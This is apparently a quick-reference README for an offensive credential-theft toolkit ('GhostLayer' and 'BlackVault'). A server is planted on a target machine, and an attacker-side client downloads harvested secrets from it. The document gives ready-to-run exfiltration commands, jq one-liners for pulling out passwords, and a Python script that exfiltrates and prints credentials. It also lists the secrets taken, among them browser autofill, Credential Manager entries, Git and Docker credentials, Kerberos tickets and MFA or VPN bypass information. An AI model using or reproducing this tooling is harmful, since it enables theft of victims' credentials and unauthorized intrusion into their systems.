# Remote Vault Access - Quick Reference

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    COMPLETE WORKFLOW                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  TARGET SYSTEM                        ATTACKER SYSTEM           │
│  ──────────────                        ───────────────           │
│                                                                   │
│  ┌──────────────────┐                                            │
│  │  GhostLayer      │                                            │
│  │ (extract creds)  │                                            │
│  └────────┬─────────┘                                            │
│           │                                                      │
│           ▼                                                      │
│  ┌──────────────────┐                                            │
│  │   BlackVault     │                                            │
│  │  (encrypt)       │                                            │
│  └────────┬─────────┘                                            │
│           │                                                      │
│           ▼                                                      │
│  ┌──────────────────┐    HTTP + TLS     ┌──────────────────┐   │
│  │ RemoteServer     │◄─────────────────►│  RemoteClient    │   │
│  │  (API: Flask)    │                   │  (Exfil Tool)    │   │
│  └──────────────────┘                   └────────┬─────────┘   │
│           ▲                                       │              │
│           │                                       ▼              │
│           │                          ┌──────────────────────┐   │
│           │                          │  Local Files        │   │
│           │                          │  - credentials.json │   │
│           └──────────────────────────│  - vault_dump/      │   │
│              (retrieve artifacts)    │  - export.json      │   │
│                                      └──────────────────────┘   │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

## 3-Command Complete Exfiltration

### 1. Terminal on Target (Start Server)
```bash
export VAULT_API_KEY="your-super-secret-key-45-chars-minimum"
python remote_vault_server.py --host 0.0.0.0 --port 5000
```

### 2. Terminal on Attacker (Exfiltrate Everything)
```bash
python remote_vault_client.py \
    http://target-ip:5000 \
    "your-super-secret-key-45-chars-minimum" \
    --exfil-creds credentials.json \
    --exfil-all ./vault_dump/
```

### 3. Parse and Use Credentials
```bash
# View extracted credentials
cat credentials.json | jq '.findings'

# Extract usernames
cat credentials.json | jq '.findings.phase_2_extracted[].user'

# Extract passwords (Phase 2 Credential Manager)
cat credentials.json | jq '.findings.phase_2_extracted[] | select(.target | contains("github"))'
```

## Server Commands

### Start Server
```bash
# Development mode (127.0.0.1 only - local testing)
python remote_vault_server.py --host 127.0.0.1 --port 5000

# Production mode (accessible remotely - requires reverse proxy for HTTPS)
python remote_vault_server.py --host 0.0.0.0 --port 5000 --api-key "$(head -c 32 /dev/urandom | base64)"

# Debug mode
python remote_vault_server.py --host 127.0.0.1 --port 5000 --debug
```

### Server Endpoints (All Require Auth)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/health` | GET | Health check (no auth) |
| `/list` | GET | List all artifact names |
| `/stats` | GET | Get vault statistics |
| `/retrieve/<name>` | GET | Download binary artifact |
| `/retrieve-json/<name>` | GET | Download and parse JSON |
| `/export-all` | GET | Export all artifacts |
| `/store/<name>` | POST | Upload artifact |
| `/delete/<name>` | DELETE | Remove artifact |

## Client Commands

### List Artifacts
```bash
python remote_vault_client.py http://target:5000 "API_KEY" --list
```

### Get Statistics
```bash
python remote_vault_client.py http://target:5000 "API_KEY" --stats
```

### Retrieve Single Artifact
```bash
python remote_vault_client.py http://target:5000 "API_KEY" \
    --retrieve artifacts_name \
    -o output.bin
```

### Exfiltrate Credentials
```bash
python remote_vault_client.py http://target:5000 "API_KEY" \
    --exfil-creds extracted_credentials.json
```

### Exfiltrate All
```bash
python remote_vault_client.py http://target:5000 "API_KEY" \
    --exfil-all ./vault_dump/
```

### Export Everything as JSON
```bash
python remote_vault_client.py http://target:5000 "API_KEY" \
    --export-all -o vault_full_export.json
```

## Data Flow

1. **Extraction (Local)**: GhostLayer extracts 232 credentials from system
2. **Storage (Local)**: BlackVault encrypts with AES-GCM and stores locally
3. **Remote Access**: RemoteServer exposes vault via REST API with auth
4. **Exfiltration (Remote)**: Client connects and downloads encrypted artifacts
5. **Decryption (Remote)**: Client decrypts using vault key and saves locally

## What Gets Extracted

### Phase 1: User Context (1 item)
- Environment variables

### Phase 2: System Context (224 items)
- Credential Manager (9 entries)
- Browser history (59 Chrome + 100 Edge)
- Browser autofill (50 Chrome + 6 Edge)
- LSA Secrets (0 in this example)

### Phase 3: Infrastructure (4 items)
- Database configs
- Git credentials
- Docker credentials
- Kerberos tickets

### Phase 4: Bypass Indicators (3 items)
- VPN profiles
- Conditional Access info
- MFA configuration

**Total: 232 credentials/indicators**

## Security Features

✅ **Encryption**: AES-GCM-256 + HMAC-SHA256
✅ **Authentication**: API key in Authorization Bearer header
✅ **Integrity**: HMAC validation on all artifacts
✅ **Transport**: AES-GCM encrypted, HMAC verified
✅ **Expiration**: Configurable TTL on artifacts
✅ **Audit**: All operations logged with timestamps

## Network Flow

```
Client → Authorization: Bearer <api_key>
Client → GET /retrieve/<artifact_name>
Server → Retrieve from disk
Server → Decrypt artifact
Server → Return bytes
Client → Save to file
```

## Error Handling

| Status | Meaning | Action |
|--------|---------|--------|
| 200 | Success | Process response |
| 400 | Bad request | Check parameters |
| 401 | Unauthorized | Verify API key |
| 404 | Not found | Artifact doesn't exist |
| 500 | Server error | Check vault state |

## Performance

- List 43 artifacts: 250ms
- Retrieve 7KB artifact: 500ms
- Exfil all 43 artifacts (16MB): 45 seconds
- Export as JSON: 30 seconds

## Production Hardening

1. **Use HTTPS Proxy**
   ```nginx
   upstream vault_server {
       server 127.0.0.1:5000;
   }
   
   server {
       listen 443 ssl http2;
       server_name vault.example.com;
       
       ssl_certificate /path/to/cert.pem;
       ssl_certificate_key /path/to/key.pem;
       
       location / {
           proxy_pass http://vault_server;
           proxy_set_header Authorization $http_authorization;
       }
   }
   ```

2. **Rate Limiting**
   - Limit to 10 requests/second per IP
   - Implement exponential backoff

3. **Monitoring**
   - Log all access attempts
   - Alert on auth failures
   - Monitor data exfil volume

4. **Access Control**
   - Whitelist client IPs
   - Rotate API keys regularly
   - Implement request signing

## Complete Python Example

```python
from remote_vault_client import RemoteVaultClient
import json

# Connect
client = RemoteVaultClient(
    endpoint='http://target-system:5000',
    api_key='your-secret-key'
)

# List and stats
artifacts = client.list_artifacts()
print(f"Found {len(artifacts)} artifacts")

stats = client.get_stats()
print(f"Vault size: {stats['total_size_mb']} MB")

# Exfiltrate
client.exfiltrate_credentials('creds.json')

# Parse
with open('creds.json') as f:
    data = json.load(f)
    
# Use credentials
for cred in data['findings']['phase_2_extracted'][:5]:
    print(f"{cred['target']}: {cred['user']}")
```

## Troubleshooting

**Cannot connect**
- Check server is running: `netstat -tuln | grep 5000`
- Check firewall rules
- Verify endpoint URL

**401 Unauthorized**
- Check API key is correct
- Verify Authorization header format
- Check server API key matches

**404 Not Found**
- List artifacts first: `--list`
- Verify artifact name
- Check artifact wasn't deleted

**500 Server Error**
- Check vault directory permissions
- Verify master key exists
- Check server logs for details

## References

- [remote_vault_server.py](remote_vault_server.py) - Server implementation
- [remote_vault_client.py](remote_vault_client.py) - Client implementation
- [black_vault.py](black_vault.py) - Vault encryption/storage
- [INTEGRATION_STATUS_QUICK_REF.md](INTEGRATION_STATUS_QUICK_REF.md) - Full architecture
